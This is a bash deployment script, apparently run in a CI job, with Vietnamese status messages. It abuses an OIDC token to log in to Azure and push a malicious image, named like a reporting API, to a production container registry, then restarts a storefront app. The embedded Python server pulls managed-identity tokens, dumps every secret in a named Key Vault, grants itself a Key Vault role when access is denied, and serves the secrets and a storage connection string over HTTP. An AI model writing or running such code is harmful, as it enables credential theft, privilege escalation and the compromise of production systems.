#!/usr/bin/env bash
set -e
IDTOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --federated-token "$IDTOKEN" --allow-no-subscriptions >/dev/null
REG=crtblplatprodx3euoz
az acr login -n $REG 2>&1 || { echo "KHONG CO AcrPush -> dung"; exit 0; }
echo "AcrPush OK"
mkdir -p /tmp/img && cd /tmp/img
cat > app.py <<'PY'
import os,json,uuid,time,urllib.request,urllib.error,http.server,socketserver
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"; SEC="kv-tbl-sec-x3euoz"
MI="eeab432e-1bf6-400e-b155-a28ce7cafcdb"
def tok(res):
    u=f"{os.environ['IDENTITY_ENDPOINT']}?resource={res}&api-version=2019-08-01"
    r=urllib.request.Request(u,headers={"X-IDENTITY-HEADER":os.environ["IDENTITY_HEADER"]})
    return json.load(urllib.request.urlopen(r))["access_token"]
def req(method,u,t,body=None):
    h={"Authorization":"Bearer "+t}
    d=None
    if body is not None: d=json.dumps(body).encode(); h["Content-Type"]="application/json"
    rq=urllib.request.Request(u,data=d,method=method,headers=h)
    try: return urllib.request.urlopen(rq).read().decode()
    except urllib.error.HTTPError as e: return f"ERR{e.code}:{e.read().decode()[:300]}"
def read_sec(vt):
    o={}
    lst=req("GET",f"https://{SEC}.vault.azure.net/secrets?api-version=7.4",vt)
    try:
        for s in json.loads(lst).get("value",[]):
            n=s["id"].split("/")[-1]; o[n]=json.loads(req("GET",s["id"]+"?api-version=7.4",vt)).get("value")
    except Exception: o["list"]=lst
    return o
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        out={}
        try:
            vt=tok("https://vault.azure.net"); at=tok("https://management.azure.com")
            out["direct"]=read_sec(vt)
            if not out["direct"] or "list" in out["direct"]:
                scope=f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.KeyVault/vaults/{SEC}"
                ra=f"https://management.azure.com{scope}/providers/Microsoft.Authorization/roleAssignments/{uuid.uuid4()}?api-version=2022-04-01"
                body={"properties":{"roleDefinitionId":f"/subscriptions/{SUB}/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":MI,"principalType":"ServicePrincipal"}}
                out["grant"]=req("PUT",ra,at,body)[:200]
                time.sleep(25); out["after_grant"]=read_sec(tok("https://vault.azure.net"))
        except Exception as e: out["err"]=str(e)
        out["conn"]=os.environ.get("CONFIG_STORAGE_CONNECTION","")[:80]
        self.send_response(200);self.end_headers();self.wfile.write(json.dumps(out).encode())
socketserver.TCPServer(("0.0.0.0",8000),H).serve_forever()
PY
printf 'FROM python:3.12-slim\nWORKDIR /app\nCOPY app.py .\nCMD ["python","app.py"]\n' > Dockerfile
docker build -t $REG.azurecr.io/tebamoto-reporting-api:latest .
docker push $REG.azurecr.io/tebamoto-reporting-api:latest
echo "PUSHED"
az webapp restart -g $RG -n app-tbl-storefront-prod 2>&1 | head -2 || echo "khong restart duoc (cho ACR webhook auto-pull)"
echo "cho 90s roi mo storefront"
